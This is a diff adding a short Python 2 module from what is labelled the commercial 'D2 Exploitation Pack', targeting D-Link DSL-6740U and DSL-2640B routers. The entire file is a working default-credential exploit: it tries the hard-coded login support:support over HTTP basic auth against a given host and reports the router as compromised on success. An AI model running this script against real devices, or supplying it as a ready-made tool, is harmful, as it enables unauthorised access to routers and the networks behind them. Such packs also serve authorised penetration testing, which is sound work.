@@ -1,0 +1,53 @@
+#! /usr/bin/env python2
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2013
+#
+
+###
+# STD modules
+###
+import os, sys
+import cStringIO
+try:
+  import pycurl
+except:
+  print 'No module pycurl'
+
+_name_   = 'd2sec_dlink_2'
+_vendor_ = 'd-link'
+_model_  = ['DSL-6740U', 'DSL-2640B']
+_vuln_   = 'Default Password Vulnerability'
+_cve_    = ''
+_ref_    = ''
+_port_   = 80
+
+creds = {
+  'support': 'support',
+}
+
+def pwnrouter(host):
+  for user,passwd in creds.items():
+    try:
+      nfo = cStringIO.StringIO()
+      c = pycurl.Curl()
+      c.setopt(pycurl.URL, 'http://%s' % host)
+      c.setopt(pycurl.USERPWD, '%s:%s' % (user, passwd))
+      c.setopt(pycurl.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
+      c.setopt(pycurl.WRITEFUNCTION, nfo.write)
+      c.perform()
+    except Exception, e:
+      print '[-] error : %s' % e
+      return
+    status = c.getinfo(pycurl.HTTP_CODE)
+    if status == 200:
+      print '[+] %s vulnerable with %s:%s' % (host, user, passwd)
+      return
+  print '[+] %s not vulnerable' % host
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
+
